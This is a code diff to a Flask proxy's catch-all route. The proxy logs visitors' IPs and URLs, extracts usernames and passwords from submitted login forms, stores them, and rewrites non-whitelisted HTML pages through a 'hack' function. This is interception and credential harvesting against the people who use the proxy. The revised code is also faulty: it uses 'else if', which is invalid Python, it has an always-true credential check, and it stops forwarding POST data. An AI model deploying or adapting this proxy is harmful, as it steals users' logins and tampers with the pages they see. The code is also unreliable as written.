@@ -102,30 +102,25 @@ def simple_rr(url, ip, u=None, p=None):
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST'])
 def catch_all(path):
-  # log the request
+  # get the params
   url = get_url(path)
   ip = request.remote_addr
+  # log the visit
   add_visited(ip, url)
-  # print 'You want path: %s' % url
-  # print request.method
-  if url.startswith("http://www.nytimes.com"):
-    return simple_rr(url, ip)
+  # make their request
+  r = make_request(url)
+  # if there's a form, check if it's a login
   if request.method == "POST":
     (u, p) = insecure_login(request.form)
-    print "POST REQUEST: "
-    print request.form
+    # if we found a username and password
     if (u, p):
+      # log that shit
       store_credentials(ip, url, u, p)
       return simple_rr(url, ip, u, p)
-    r = requests.post(url, data=dict(request.form))
-  else:
-    r = make_request(url)
-    for entry in whitelist:
-        if url.split("/")[2].endswith(entry):
-            print url.upper()
-            return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/html"))
-    if "text/html" in r.headers.get('content-type', "text/plain"):
-        return Response(hack(r.text))
+  # hack the page if it's not on the whitelist and is actually HTML
+  else if url.split("/")[2] not in whitelist and "text/html" in r.headers.get('content-type'):
+    return Response(hack(r.text))
+  # else stream the content back
   return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/html"))
 
 @app.route('/login')
